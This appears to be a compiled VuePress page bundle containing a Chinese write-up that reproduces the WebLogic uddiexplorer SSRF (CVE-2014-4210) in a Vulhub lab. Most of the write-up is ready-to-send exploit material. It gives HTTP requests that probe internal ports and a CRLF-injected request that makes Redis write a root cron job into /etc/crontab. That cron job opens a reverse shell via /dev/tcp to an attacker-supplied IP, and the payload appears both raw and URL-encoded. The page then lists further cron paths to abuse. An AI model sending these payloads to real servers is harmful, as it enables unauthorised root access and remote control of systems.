import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as c,c as s,a as e,b as i,d as n,e as o}from"./app-58e4a7d6.js";const d={},l=o(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Oracle WebLogic Server 10.0.2.0
Oracle WebLogic Server 10.3.6.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub编译及启动测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022107741.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，我们在burpsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<code>http://127.0.0.1:80</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1
Host: your-vps-ip:7001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022110046.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022111161.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过错误的不同，即可探测内网状态。</p><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><blockquote><p>此处kali启动redis失败，转为CentOS vps进行复现。</p></blockquote><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.2:6379</code>可以连通：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022205403.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>test

set 1 &quot;\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/your-reverse-shell-ip/9999 0&gt;&amp;1&#39;\\n\\n\\n\\n&quot;
config set dir /etc/
config set dbfilename crontab
save

aaa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>进行url编码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fyour-reverse-shell-ip%2F9999%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>注意，换行符是“\\r\\n”，也就是“%0D%0A”。</p><p>将url编码后的字符串放在ssrf的域名后面，发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.20.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fyour-reverse-shell-ip%2F9999%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: your-vps-ip:7001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功反弹：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022208358.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>最后补充一下，可进行利用的cron有如下几个地方：</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root是centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root是debian系统下root用户的cron文件</li></ul><h2 id="开源poc" tabindex="-1"><a class="header-anchor" href="#开源poc" aria-hidden="true">#</a> 开源POC</h2>`,34),p={href:"https://github.com/0xn0ne/weblogicScanner",target:"_blank",rel:"noopener noreferrer"},u={href:"https://github.com/rabbitmask/WeblogicScan",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/dr0op/WeblogicScan",target:"_blank",rel:"noopener noreferrer"};function h(g,m){const a=r("ExternalLinkIcon");return c(),s("div",null,[l,e("ul",null,[e("li",null,[e("a",p,[i("https://github.com/0xn0ne/weblogicScanner"),n(a)])]),e("li",null,[e("a",u,[i("https://github.com/rabbitmask/WeblogicScan"),n(a)])]),e("li",null,[e("a",b,[i("https://github.com/dr0op/WeblogicScan"),n(a)])])])])}const x=t(d,[["render",h],["__file","Weblogic uddiexplorer SSRF漏洞 CVE-2014-4210.html.vue"]]);export{x as default};
